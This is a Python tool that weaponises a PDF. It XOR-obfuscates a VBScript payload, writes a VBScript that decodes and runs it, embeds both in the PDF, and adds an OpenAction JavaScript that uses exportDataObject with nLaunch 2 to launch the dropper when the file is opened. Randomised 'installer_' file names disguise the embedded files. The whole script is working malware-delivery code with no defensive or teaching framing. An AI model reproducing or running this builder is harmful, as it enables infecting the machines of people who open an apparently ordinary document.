import os
import sys
import pikepdf
import random
import string
from pikepdf import Name, Dictionary, Stream, Array

def xor_encrypt(data: bytes, key: int = 23) -> bytes:
    return bytes([b ^ key for b in data])

def generate_random_name(ext="vbs", length=6):
    name = ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    return f"installer_{name}.{ext}"

def find_pdf():
    for file in os.listdir('.'):
        if file.lower().endswith(".pdf") and not file.startswith("autorun_"):
            return file
    return None

def embed_file_with_js(pdf_path, files_to_embed, js_target, output_path):
    try:
        with pikepdf.open(pdf_path, allow_overwriting_input=True) as pdf:
            for fname in files_to_embed:
                ef_stream = Stream(pdf, open(fname, 'rb').read())
                ef_stream_obj = pdf.make_indirect(ef_stream)
                filespec = Dictionary({
                    Name.Type: Name('Filespec'),
                    Name.F: fname,
                    Name.UF: fname,
                    Name.EF: Dictionary({ Name.F: ef_stream_obj, Name.UF: ef_stream_obj }),
                    Name.Desc: "Embedded file"
                })
                filespec_obj = pdf.make_indirect(filespec)

                if '/Names' not in pdf.Root:
                    pdf.Root.Names = Dictionary()
                if '/EmbeddedFiles' not in pdf.Root.Names:
                    pdf.Root.Names.EmbeddedFiles = Dictionary({ Name.Names: Array([fname, filespec_obj]) })
                else:
                    names = pdf.Root.Names.EmbeddedFiles.Names
                    names.append(fname)
                    names.append(filespec_obj)

            js_code = f"""
            try {{
                var exists = this.getDataObjectContents("{js_target}");
                if (!exists || exists.length === 0) {{
                    this.exportDataObject({{ cName: "{js_target}", nLaunch: 2 }});
                }}
            }} catch (e) {{
                try {{
                    this.exportDataObject({{ cName: "{js_target}", nLaunch: 2 }});
                }} catch (err) {{}}
            }}
            """
            js_stream = Stream(pdf, js_code.encode('utf-8'))
            js_stream_obj = pdf.make_indirect(js_stream)
            js_action = Dictionary({
                Name.Type: Name('Action'),
                Name.S: Name('JavaScript'),
                Name.JS: js_stream_obj
            })
            pdf.Root.OpenAction = pdf.make_indirect(js_action)

            pdf.save(output_path)
            print(f"[+] Created: {output_path}")
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)

def main():
    pdf_file = find_pdf()
    if not pdf_file:
        print("[!] No PDF found.")
        return

    # Generate names
    decrypt_name = generate_random_name("vbs")
    encrypted_name = generate_random_name("enc")

    # Encrypt original setup.vbs
    if not os.path.isfile("setup.vbs"):
        print("[!] setup.vbs not found.")
        return

    with open("setup.vbs", "rb") as f:
        encrypted = xor_encrypt(f.read(), key=23)
    with open(encrypted_name, "wb") as f:
        f.write(encrypted)

    # Write decrypt.vbs
    decrypt_code = f"""
Set fso = CreateObject("Scripting.FileSystemObject")
Set input = fso.OpenTextFile("{encrypted_name}", 1)
Set output = fso.CreateTextFile("setup_decoded.vbs", True)
Do While Not input.AtEndOfStream
    line = input.Read(1)
    decoded = Chr(Asc(line) Xor 23)
    output.Write decoded
Loop
input.Close
output.Close
CreateObject("Wscript.Shell").Run "setup_decoded.vbs"
"""
    with open(decrypt_name, "w", encoding="utf-8") as f:
        f.write(decrypt_code.strip())

    output_file = f"autorun_{pdf_file}"
    embed_file_with_js(pdf_file, [decrypt_name, encrypted_name], decrypt_name, output_file)

if __name__ == '__main__':
    main()
